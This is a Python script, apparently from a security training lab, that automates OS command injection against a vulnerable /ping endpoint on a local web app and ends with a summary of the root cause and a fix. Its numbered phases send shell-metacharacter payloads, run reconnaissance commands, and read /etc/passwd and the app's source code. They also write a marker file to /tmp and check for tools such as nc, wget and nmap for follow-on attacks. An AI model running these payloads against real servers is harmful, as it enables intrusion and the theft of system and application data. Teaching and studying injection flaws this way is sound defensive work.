#!/usr/bin/env python3
"""
Command Injection -- Automated Exploit
========================================

demonstrates OS command injection through the /ping endpoint
the vulnerable code builds a shell command with f-string interpolation:
    cmd = f"ping -c 2 {host}"
    subprocess.run(cmd, shell=True, ...)

because shell=True is set, the shell interprets everything we send
so we can chain our own commands after the ping using metacharacters:
    ;     -> run next command regardless: ping host; whoami
    &&    -> run next command if ping succeeds: ping host && id
    ||    -> run next command if ping fails: invalid || whoami
    |     -> pipe ping output into our command: ping host | cat /etc/passwd
    $()   -> command substitution: ping $(whoami)
    ``    -> legacy substitution: ping `id`

unlike LFI which can only read files, command injection gives full OS access
the attacker can read, write, execute, install tools, open reverse shells

usage:
    python3 scripts/cmdi.py
    python3 scripts/cmdi.py --target http://127.0.0.1:5000
"""

import argparse
import re
import sys
import time

try:
    import requests
except ImportError:
    print("Run: pip install requests")
    sys.exit(1)


# ──────────────────────────────────────────────
# config
# ──────────────────────────────────────────────

DEFAULT_TARGET = "http://127.0.0.1:5000"

# unique throwaway username so multiple runs don't clash
ATTACKER_USER = "cmdi_" + str(int(time.time()))[-6:]
ATTACKER_PASS = "cmdi_probe_2026"


# ──────────────────────────────────────────────
# terminal colors
# ──────────────────────────────────────────────

class C:
    R = "\033[91m"   # red
    G = "\033[92m"   # green
    Y = "\033[93m"   # yellow
    CN = "\033[96m"  # cyan
    B = "\033[1m"    # bold
    D = "\033[2m"    # dim
    M = "\033[95m"   # magenta
    X = "\033[0m"    # reset

def banner(t):
    print(f"\n{C.B}{'=' * 62}\n  {t}\n{'=' * 62}{C.X}")

def ok(m):   print(f"  {C.G}[+]{C.X} {m}")
def fail(m): print(f"  {C.R}[-]{C.X} {m}")
def info(m): print(f"  {C.CN}[*]{C.X} {m}")
def warn(m): print(f"  {C.Y}[!]{C.X} {m}")


def is_login_page(text):
    """we check for both the title and the username field because some error pages
    might also have 'Login' in the title but won't have the form"""
    return "<title>Login</title>" in text and 'name="username"' in text


def extract_output(html):
    """pulls the command output from the <pre> block in ping.html
    the template wraps it in <h4>Output:</h4><pre>...output here...</pre>
    we need to unescape HTML entities because the output goes through Jinja2"""
    m = re.search(r'<h4[^>]*>Output:</h4>\s*<pre[^>]*>(.*?)</pre>', html, re.DOTALL)
    if m:
        text = m.group(1).strip()
        # undo HTML escaping so we see the real command output
        text = text.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
        text = text.replace('&#39;', "'").replace('&quot;', '"')
        return text
    return None


def ping(session, target, host_input):
    """sends a POST request to /ping with our payload in the host field
    returns the extracted output text, or None if we got redirected to login"""
    resp = session.post(f"{target}/ping", data={"host": host_input}, timeout=15)
    # if the response is the login page, our session expired
    if is_login_page(resp.text):
        return None
    return extract_output(resp.text)


# ──────────────────────────────────────────────
# phase 0 -- authenticate
# we need a session cookie to access /ping because of the before_request hook
# ──────────────────────────────────────────────

def phase0_auth(session, target):
    banner("PHASE 0 -- Authenticate")
    info(f"Creating throwaway account: '{ATTACKER_USER}'")

    try:
        # try registering first, if username is taken fall back to login
        resp = session.post(f"{target}/register", data={
            "username": ATTACKER_USER,
            "password": ATTACKER_PASS,
            "confirm": ATTACKER_PASS,
        }, allow_redirects=True, timeout=5)

        if is_login_page(resp.text):
            # registration probably failed because username exists, try logging in
            resp = session.post(f"{target}/login", data={
                "username": ATTACKER_USER,
                "password": ATTACKER_PASS,
            }, allow_redirects=True, timeout=5)
            if is_login_page(resp.text):
                fail("Authentication failed")
                return False

        ok(f"Authenticated as '{ATTACKER_USER}'")
        return True
    except requests.exceptions.ConnectionError:
        fail(f"Cannot connect to {target}")
        return False


# ──────────────────────────────────────────────
# phase 1 -- confirm the ping endpoint works normally
# we send a legitimate ping first to make sure the endpoint exists
# and we can parse its output correctly
# ──────────────────────────────────────────────

def phase1_normal(session, target):
    banner("PHASE 1 -- Confirm Normal Ping Works")
    info("Sending a legitimate ping to 127.0.0.1...\n")

    output = ping(session, target, "127.0.0.1")
    # a successful ping shows "bytes from" or starts with "PING"
    if output and ("bytes from" in output or "PING" in output):
        ok("Ping endpoint works normally")
        # show the first 3 lines so the user can see what normal output looks like
        for line in output.strip().split('\n')[:3]:
            print(f"  {C.D}  {line}{C.X}")
        return True
    elif output:
        # we got some output but it doesn't look like a ping response
        warn(f"Unexpected output: {output[:100]}")
        return True
    else:
        fail("No output from ping -- is /ping endpoint in app.py?")
        return False


# ──────────────────────────────────────────────
# phase 2 -- test different shell metacharacter techniques
# each technique injects 'whoami' using a different separator
# we compare the output against normal ping output to detect injection
# ──────────────────────────────────────────────

def phase2_test_techniques(session, target):
    banner("PHASE 2 -- Test Shell Metacharacter Techniques")
    info("Trying different separators to inject 'whoami'...\n")

    # each tuple is (human label, actual payload, explanation of the technique)
    techniques = [
        ("Semicolon",       "127.0.0.1; whoami",    "cmd1 ; cmd2 -- run both sequentially"),
        ("AND operator",    "127.0.0.1 && whoami",  "cmd1 && cmd2 -- run cmd2 if cmd1 succeeds"),
        ("OR operator",     "invalid || whoami",    "cmd1 || cmd2 -- run cmd2 if cmd1 fails"),
        ("Pipe",            "127.0.0.1 | whoami",   "cmd1 | cmd2 -- pipe output to cmd2"),
        ("Newline",         "127.0.0.1\nwhoami",    "cmd1\\ncmd2 -- newline acts as separator"),
        ("Subshell $()",    "$(whoami)",            "$(cmd) -- command substitution"),
        ("Backticks",       "`whoami`",             "`cmd` -- legacy command substitution"),
    ]

    working = []

    for label, payload, desc in techniques:
        output = ping(session, target, payload)
        
        if output is None:
            fail(f"{label:<16} -- session lost")
            continue

        # we need to separate the injected command's output from ping's normal output
        # ping output contains specific keywords like PING, bytes from, statistics, rtt
        # anything else in the output is likely from our injected command
        lines = [l.strip() for l in output.strip().split('\n') if l.strip()]
        injected_output = [l for l in lines 
                           if 'PING' not in l 
                           and 'bytes from' not in l 
                           and 'packet' not in l
                           and 'time=' not in l
                           and 'statistics' not in l
                           and 'rtt' not in l
                           and 'ping:' not in l.lower()
                           and l.strip()]

        if injected_output:
            # the first non-ping line is usually the whoami result (username like 'potato')
            username = injected_output[0]
            ok(f"{label:<16} {C.R}{payload:<30}{C.X} -> {C.Y}{username}{C.X}")
            info(f"  {C.D}{desc}{C.X}")
            working.append((label, payload, username))
        else:
            fail(f"{label:<16} {C.D}{payload:<30}{C.X} -- no injected output visible")

    print(f"\n  {C.B}{len(working)}/{len(techniques)} techniques worked{C.X}")
    return working


# ──────────────────────────────────────────────
# phase 3 -- gather system information
# once we know injection works, we run reconnaissance commands
# to understand the target system before escalating
# ──────────────────────────────────────────────

def phase3_recon(session, target):
    banner("PHASE 3 -- System Reconnaissance")
    info("Gathering system information via injected commands...\n")

    # each command reveals something useful for the next attack step
    # username and id tell us our privilege level
    # hostname and uname help identify the target
    # pwd and ls tell us where we are on the filesystem
    recon_commands = [
        ("Username",         "; whoami"),
        ("User ID",          "; id"),
        ("Hostname",         "; hostname"),
        ("OS Info",          "; uname -a"),
        ("Current Dir",      "; pwd"),
        ("Home Dir",         "; ls -la ~"),
        ("Python Version",   "; python3 --version"),
        ("Network Config",   "; ip addr show | head -5"),
        ("Running As",       "; ps aux | head -3"),
    ]

    results = {}

    for label, payload in recon_commands:
        output = ping(session, target, payload)
        if output is None:
            fail(f"{label:<18} -- session lost")
            continue

        # strip out the ping output, keep only our injected command's result
        lines = output.strip().split('\n')
        injected = [l for l in lines
                    if 'PING' not in l
                    and 'bytes from' not in l
                    and 'packet' not in l
                    and 'time=' not in l
                    and 'statistics' not in l
                    and 'rtt' not in l
                    and l.strip()]

        if injected:
            result = '\n'.join(injected[:5])  # cap at 5 lines to keep output clean
            results[label] = result
            ok(f"{label:<18} {C.Y}{injected[0]}{C.X}")
            # show additional lines indented
            for extra_line in injected[1:5]:
                print(f"  {C.D}{'':>21}{extra_line}{C.X}")
        else:
            fail(f"{label:<18} -- no output")

    return results


# ──────────────────────────────────────────────
# phase 4 -- read sensitive files
# this is similar to what LFI does via /download, but through command injection
# we have more control because we can use head, tail, grep to extract specific parts
# ──────────────────────────────────────────────

def phase4_read_files(session, target):
    banner("PHASE 4 -- Read Sensitive Files")
    info("Using command injection to read files (like LFI but more powerful)...\n")

    files_to_read = [
        ("/etc/hostname",              "Server hostname"),
        ("/etc/passwd",                "System users (first 5 lines)"),
        ("app.py",                     "Application source code (first 10 lines)"),
    ]

    for filepath, desc in files_to_read:
        # we use head to limit the output because dumping an entire file
        # would flood the console and might hit response size limits
        if filepath.startswith("/"):
            payload = f"; head -5 {filepath}"
        else:
            payload = f"; head -10 {filepath}"

        output = ping(session, target, payload)
        if output is None:
            fail(f"{desc} -- session lost")
            continue

        # filter out ping's own output
        lines = output.strip().split('\n')
        injected = [l for l in lines
                    if 'PING' not in l
                    and 'bytes from' not in l
                    and 'packet' not in l
                    and 'time=' not in l
                    and 'statistics' not in l
                    and 'rtt' not in l]

        if injected:
            ok(f"{desc}: {C.D}{filepath}{C.X}")
            for line in injected[:8]:
                print(f"  {C.D}  {line.rstrip()}{C.X}")
            print()
        else:
            fail(f"{desc} -- no output")


# ──────────────────────────────────────────────
# phase 5 -- prove we can write files and find installed tools
# reading is one thing, writing proves we have real OS-level control
# we also survey what tools are installed because they determine
# what the attacker can do next (wget for downloads, nc for reverse shells, etc)
# ──────────────────────────────────────────────

def phase5_write_demo(session, target):
    banner("PHASE 5 -- Demonstrate Write Capability")
    info("Proving the attacker can also WRITE files and execute programs.\n")

    # write a proof-of-concept marker file to /tmp/
    # /tmp is world-writable on linux so this will always succeed
    marker = f"HACKED_BY_{ATTACKER_USER}_{int(time.time())}"
    payload = f"; echo '{marker}' > /tmp/cmdi_proof.txt"
    info(f"Writing marker to /tmp/cmdi_proof.txt...")
    ping(session, target, payload)

    # read it back to confirm the write actually worked
    output = ping(session, target, "; cat /tmp/cmdi_proof.txt")
    if output and marker in output:
        ok(f"File written and verified: {C.R}{marker}{C.X}")
    else:
        fail("Could not verify written file")

    # clean up after ourselves
    ping(session, target, "; rm /tmp/cmdi_proof.txt")
    info("Cleaned up proof file\n")

    # check what tools are available on the system
    # each tool enables different post-exploitation techniques:
    #   curl/wget -> download malware or exfiltrate data
    #   python3   -> run complex scripts, spawn shells
    #   gcc       -> compile exploits locally
    #   nc        -> open a reverse shell back to the attacker
    #   nmap      -> scan the internal network
    #   ssh       -> pivot to other machines
    info("Checking available tools on the system:")
    tools = ["curl", "wget", "python3", "gcc", "nc", "nmap", "ssh"]
    for tool in tools:
        # 'which' returns the full path if the tool exists, nothing if it doesn't
        # 2>/dev/null suppresses the "not found" error message
        output = ping(session, target, f"; which {tool} 2>/dev/null")
        lines = [l.strip() for l in (output or "").split('\n')
                 if l.strip() and 'PING' not in l and 'bytes' not in l
                 and 'packet' not in l and 'statistics' not in l and 'rtt' not in l]
        if lines and '/' in lines[0]:
            warn(f"  {tool:<10} -> {C.R}{lines[0]}{C.X}  (available)")
        else:
            info(f"  {tool:<10} -> {C.D}not found{C.X}")


# ──────────────────────────────────────────────
# summary
# ──────────────────────────────────────────────

def print_summary():
    banner("ATTACK SUMMARY -- Command Injection")
    print(f"""
  {C.B}Attack chain:{C.X}

    Register -> Ping tool -> {C.R}127.0.0.1; whoami{C.X} -> OS command execution
         |
    System recon: username, hostname, OS version, network config
         |
    File reading: /etc/passwd, app.py source code
         |
    File writing: proof-of-concept marker file
         |
    Tool survey: curl, wget, python3, gcc, nc available?

  {C.Y}LFI vs Command Injection:{C.X}

    LFI:      Can only READ files via path traversal
    Cmd Inj:  Can READ, WRITE, EXECUTE -- full OS access
              The attacker owns the server process.

  {C.Y}Root cause:{C.X}
    cmd = f"ping -c 2 {{host}}"
    subprocess.run(cmd, {C.R}shell=True{C.X}, ...)

    User input goes directly into a shell command.
    shell=True enables all shell metacharacters.

  {C.Y}Fix:{C.X}
    {C.G}# pass arguments as a list -- shell=False (default){C.X}
    subprocess.run(["ping", "-c", "2", host], capture_output=True)

    {C.G}# or validate input strictly{C.X}
    import re
    if not re.match(r'^[a-zA-Z0-9._-]+$', host):
        return "Invalid hostname"
""")


# ──────────────────────────────────────────────
# main
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Command Injection -- Automated Exploit")
    parser.add_argument("--target", default=DEFAULT_TARGET)
    args = parser.parse_args()
    target = args.target.rstrip("/")

    print(f"""
{C.B}{C.R}
   ██████╗███╗   ███╗██████╗ ██╗
  ██╔════╝████╗ ████║██╔══██╗██║
  ██║     ██╔████╔██║██║  ██║██║
  ██║     ██║╚██╔╝██║██║  ██║██║
  ╚██████╗██║ ╚═╝ ██║██████╔╝██║
   ╚═════╝╚═╝     ╚═╝╚═════╝ ╚═╝
{C.X}
  {C.D}OS Command Injection via Network Diagnostic Tool{C.X}
  {C.D}Target: {target}{C.X}
""")

    session = requests.Session()

    if not phase0_auth(session, target):
        sys.exit(1)

    if not phase1_normal(session, target):
        sys.exit(1)

    working = phase2_test_techniques(session, target)
    if not working:
        fail("No injection technique worked")
        sys.exit(1)

    phase3_recon(session, target)
    phase4_read_files(session, target)
    phase5_write_demo(session, target)
    print_summary()


if __name__ == "__main__":
    main()
